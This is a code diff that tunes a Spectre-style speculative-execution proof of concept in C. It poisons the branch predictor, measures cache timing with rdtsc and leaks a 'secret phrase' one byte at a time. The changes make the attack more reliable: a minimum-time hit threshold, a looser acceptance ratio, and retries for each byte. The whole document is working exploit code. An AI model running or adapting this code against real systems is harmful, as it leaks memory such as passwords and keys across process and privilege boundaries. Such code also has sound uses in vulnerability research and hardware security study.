@@ -93,9 +93,9 @@ int readByte(char *addrToRead, char result[2]) {
     channel[i * GAP] = 1;
   }
 
-  for (tries = 9999; tries > 0; tries--) {
+  for (tries = 999; tries > 0; tries--) {
     // poison branch predictor
-    for (j = 10000; j > 0; j--) {
+    for (j = 1000; j > 0; j--) {
       junk ^= uv(channel, uga, 0);
     }
     mfence();
@@ -121,12 +121,21 @@ int readByte(char *addrToRead, char result[2]) {
       junk ^= *addr;
       mfence(); // make sure read completes before we check the timer
       elapsed = rdtsc() - start;
-      if (elapsed <= CACHE_HIT_THRESHOLD) {
-        hits[mix_i]++;
-        if (hits[mix_i] > 20) // Stop early if there is a clear signal
+      times[mix_i] = elapsed;
+    }
+
+    int mint = 150;
+    for (int i = 0; i < 256; i++) {
+      if (times[i] < mint)
+        mint = times[i];
+    }
+
+    for (i = 0; i < 256; i++) {
+      if (times[i] <= mint) {
+        hits[i]++;
+        if (hits[i] > 20) // Stop early if there is a clear signal
           tries = 0;
       }
-      times[i] = elapsed;
     }
   }
 
@@ -140,11 +149,12 @@ int readByte(char *addrToRead, char result[2]) {
       k = i;
     }
   }
-  if ((hits[j] >= 2 * hits[k] + 2) ||
+  if ((hits[j] >= 3 * hits[k] / 2 + 2) ||
       (hits[j] >= 2 && hits[k] == 0)) {
     result[0] = (char)j;
     result[1] = 1;
   } else {
+    // printf("[%d:%d]", hits[j], hits[k]);
     result[0] = 0;
     result[1] = 0;
   }
@@ -193,8 +203,9 @@ int main(int argc, char *argv[]) {
   int junk = 0;
   printf("Reading secret phrase: "); fflush(stdout);
   for (int index = 0; index < secret_len; index++) {
-    char result[2]; // result[0] is the char, result[1] == 1 if char is valid
-    junk += readByte(((char*) secret_addr) + index, result);
+    char result[2] = { 0, 0 }; // result[0] is the char, result[1] == 1 if char is valid
+    for (int i = 0; i < 3 && result[1] == 0; i++)
+      junk += readByte(((char*) secret_addr) + index, result);
     if (result[1] == 1) {
       printf("%c", result[0]);
     } else {
